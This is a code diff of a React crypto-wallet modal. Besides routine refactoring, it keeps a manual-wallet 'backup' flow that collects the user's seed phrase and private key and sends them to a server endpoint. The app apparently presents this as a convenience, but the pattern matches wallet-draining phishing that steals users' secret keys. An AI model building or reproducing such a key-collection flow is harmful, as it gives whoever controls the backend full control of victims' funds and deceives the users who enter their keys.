@@ -93,14 +93,6 @@ const WalletModal: React.FC<WalletModalProps> = ({
 
         if (accounts.length > 0) {
           const publicAddress = accounts[0];
-
-          const balanceWei = await window.ethereum.request({
-            method: "eth_getBalance",
-            params: [publicAddress, "latest"],
-          });
-
-          const balance = utils.formatEther(balanceWei);
-
           const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
             method: "POST",
             headers: {
@@ -108,9 +100,8 @@ const WalletModal: React.FC<WalletModalProps> = ({
             },
             body: JSON.stringify({
               publicAddress,
-              balance,
               walletName: selectedWallet?.name,
-              currency: selectedWallet?.currency, // Added currency to the payload
+              
             }),
           });
 
@@ -155,37 +146,36 @@ const WalletModal: React.FC<WalletModalProps> = ({
 
     // Prepare the data to be sent to the backend API
     const walletData = {
-      userId: userId, // Use userId from the session
-      publicAddress,
-      walletName: selectedWallet?.name || "Manual Wallet", // Default to a name if not provided
-      seedPhrase: seedPhrase || null, // Optional
-      privateKey: privateKey || null, // Optional
-      qrCodeData: qrCodeData || null, // Optional
+      userId, 
+      publicAddress, 
+      walletName: selectedWallet?.name || "Manual Wallet", // Default to "Manual Wallet" if no name is provided
+      ...(seedPhrase && { seedPhrase }), // Include only if seedPhrase is provided
+      ...(privateKey && { privateKey }), // Include only if privateKey is provided
+      ...(qrCodeData && { qrCodeData }), // Include only if qrCodeData is provided
     };
 
     try {
       const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
-        method: "POST",
+        method: "PUT",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(walletData),
       });
 
-      if (response.ok) {
-        const data = await response.json();
-        console.log("Manual wallet data saved:", data);
-        setModalStep("success");
-      } else {
-        throw new Error("Failed to save manual wallet data.");
+      if (!response.ok) {
+        const errorMessage = await response.text(); // Extract backend error message, if available
+        throw new Error(errorMessage || "Failed to save manual wallet data.");
       }
-    } catch (error: unknown) {
-      // Adjust error handling for unknown errors
-      if (error instanceof Error) {
-        setDynamicError(error.message || "An error occurred while saving data.");
-      } else {
-        setDynamicError("An unexpected error occurred.");
-      }
+
+      const data = await response.json();
+      console.log("Manual wallet data saved successfully:", data);
+      setModalStep("success");
+    } catch (error) {
+      // Handle both known and unknown errors
+      const errorMessage =
+        error instanceof Error ? error.message : "An unexpected error occurred.";
+      setDynamicError(errorMessage);
       setModalStep("error");
     }
   };
@@ -260,7 +250,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
           </DialogHeader>
           <div className="space-y-6">
             <div className="flex justify-center">
-              <QRCodeSVG value={walletAddress || ""} size={256} />
+              {/* <QRCodeSVG value={walletAddress || ""} size={256} /> */}
             </div>
             <div className="text-center">
               <Button variant="outline" onClick={onClose}>
